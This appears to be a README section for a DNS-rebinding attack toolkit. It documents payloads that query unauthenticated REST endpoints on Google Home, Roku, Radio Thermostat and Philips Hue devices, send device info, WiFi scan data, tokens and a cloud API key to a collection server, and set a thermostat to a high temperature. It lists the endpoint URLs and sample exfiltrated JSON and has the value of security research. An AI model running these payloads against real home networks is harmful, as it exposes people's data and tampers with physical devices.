# Common Payloads

The `payloads/` folder contains a small collection of payloads written for common home IoT devices.

- `google-home.html`: A payload that targets [Google Home's undocumented REST API](https://rithvikvibhu.github.io/GHLocalApi/). This API is supported by several Google Home products, like Chromecast, certain smart TVs, and of course the Google Home and Google Home Mini.
- `roku-info.html`: [Roku's External Control API](https://sdkdocs.roku.com/display/sdkdoc/External+Control+API) allows direct control over the device via an unauthenticated REST API. There is plenty of fun to be had here.
- `radio-thermostat.html`: The [WiFi Radio Thermostat CT50 & CT80](https://github.com/brannondorsey/radio-thermostat) don't require [any authentication](https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2013-022/?fid=3870) to their REST APIs. This payload exploits this vulnerability and sets the building temperature to 90 degrees and exfiltrates a cloud API key.
- `phillips-hue.html`: Detect the presence of a Phillips Hue Bridge lighting system and exfiltrate basic information about the device.

## Google Home

Chromecast has been using an undocumented API served on port 8008 [since at least 2013](http://fiquett.com/2013/07/chromecast-traffic-sniffing/). Recently [Rithvik Vibhu](https://github.com/rithvikvibhu/) did a bang up job [documenting the hell out of it](https://rithvikvibhu.github.io/GHLocalApi). When they rolled out their line of Google Home products it appears they have also integrated the same API into those products as well. `payloads/google-home.html` exploits a few of these API calls to exfiltrate information about the Chromecast device and its surrounding WiFi networks to `server.js`. Specifically, it makes GET requests to the following URLs:

```bash
# assuming a Google Home device is present at 192.168.1.24

# get basic information about the device
http://192.168.1.24:8008/setup/eureka_info?params=version,audio,name,build_info,detail,device_info,net,wifi,setup,settings,opt_in,opencast,multizone,proxy,night_mode_params,user_eq,room_equalizer

# get a list of nearby wifi networks from a recent WiFi scan
http://192.168.1.24:8008/setup/scan_results

# get a mysterious access token. Idk what it is used for?
http://192.168.1.24:8008/setup/offer
```

The payload combines the results of these three queries into on JSON object and uploads it to `server.js` where it is saved in the `data/` directory.

[Here](https://pastebin.com/U3tUqmRf) is an example of the JSON file created by my chromecast at home.

## Roku

The [Roku External Control API](https://sdkdocs.roku.com/display/sdkdoc/External+Control+API) provides unauthenticated control of the entertainment device. `payloads/roku-info.html` exfiltrates information about the device as JSON to `server.js`. 

```bash
# assuming a Roku device is present at 192.168.1.88

# get basic device info
http://192.168.1.88:8060:query/device-info

# get a list of all apps on the device
http://192.168.1.88:8060:query/apps
```

Full device control is available over this API. You can open apps, play content, and control keypresses. I'll leave it up to someone else to write experiment with this functionality ;) PRs welcome!

Here is an example of Roku data exfiltrated using [`payloads/roku-info.html`](https://pastebin.com/WSv5egcY).

**Note**: The exfiltrated data is served as XML from the Roku device, but converted to JSON by `share/xmlToJSON.min.js`. It's not pretty, but I opted for JSON consistency across exfiltrated data in this repo. A custom payload could easily be written to preserve the original XML.

## Radio Thermostat

The [Radio Thermostat CT50 & CT80](http://www.radiothermostat.com/) (perhaps other models too) support a documented REST API to control heating/cooling in your house from your LAN. This is particularly interesting because there isn't any authentication to access this API, leaving anyone on the network to have full control of the device. Daniel Crowly of Trustwave SpiderLabs [reported this vulnerability](https://web.archive.org/web/20180401193243/https://www.trustwave.com/Resources/Security-Advisories/Advisories/TWSL2013-022/?fid=3870) back in 2013, but the company doesn't seem to give a sh!t.

> CVE: CVE-2013-4860
> CWE: CWE-287 Improper Authentication

>When on the same network as a Radio Thermostat unit, no authentication is
required to use any part of the API. Users on the same subnet as the unit
can query and change various settings such as the operation mode, wifi
connection settings, and temperature thresholds.

This unauthenticated physical control API makes a perfect target for DNS rebind attacks from the WAN. `payloads/radio-thermostat.html` exfiltrates building temperature, basic system information, device name, network information, and a cloud API key before setting the target temperature in the house to 95 degrees.

```bash
# assuming a Radio Thermostat device is present at 192.168.1.209

# get the current temperature
http://192.168.1.209/tstat/temp

# get basic system information
http://192.168.1.209/sys

# get the device name
http://192.168.1.209/sys/name

# get info about the WiFi network the device is connected to
http://192.168.1.209/sys/network

# see if there is a cloud key sitting on this device
http://192.168.1.209/cloud

# and of course... set the temperature to 95 degrees!
http://192.168.1.209/tstat
```

The data exfiltrated by `payloads/radio-thermostat.html` is saved to `data/` and looks like this:

```json
{
    "uuid": "2002af759f67",
    "api_version": 113,
    "fw_version": "1.04.84",
    "wlan_fw_version": "v10.105576",
    "name": "TotallySecureThermostat",
    "ssid": "myWiFiNetwork",
    "bssid": "79:8e:cd:87:2c:38",
    "channel": 11,
    "security": 4,
    "ip": 1,
    "rssi": -33,
    "interval": 300,
    "url": "http://ws.radiothermostat.com/services.svc/StatIn",
    "status": 0,
    "enabled": 0,
    "authkey": "",
    "status_code": 0,
    "temp": 73.5
} 
```

See [brannondorsey/radio-thermostat](https://github.com/brannondorsey/radio-thermostat) for full documentation of this REST API.

## Phillips Hue Bridge

Up until 2016 the Phillip's Hue Bridge wireless light bulb controller could easily be controlled by an unauthenticated attacker. They've since updated their firmware to protect against this. While you can no longer control the device via a DNS rebinding attack you can still identify that a hue bridge is on the network and exfiltrate basic information about the device. The data that can be accessed is relatively harmless.

```bash
# assuming a phillips hue bridge device is present at 192.168.1.8

# get basic info about the device. Best I can tell this is the only API endpoint
# that can be accessed by an unauthenticated user. Authentication requires
# physical access.
http://192.168.1.8/api/nouser/config
```

The data exfiltrated by `payloads/phillips-hue.html` is saved to `data/` and looks like this:

```json
{
    "name": "Philips hue",
    "datastoreversion": "70",
    "swversion": "1802201122",
    "apiversion": "1.24.0",
    "mac": "00:17:88:6f:a5:91",
    "bridgeid": "001788FFFD69A591",
    "factorynew": false,
    "replacesbridgeid": null,
    "modelid": "BSB002",
    "starterkitid": ""
}
```


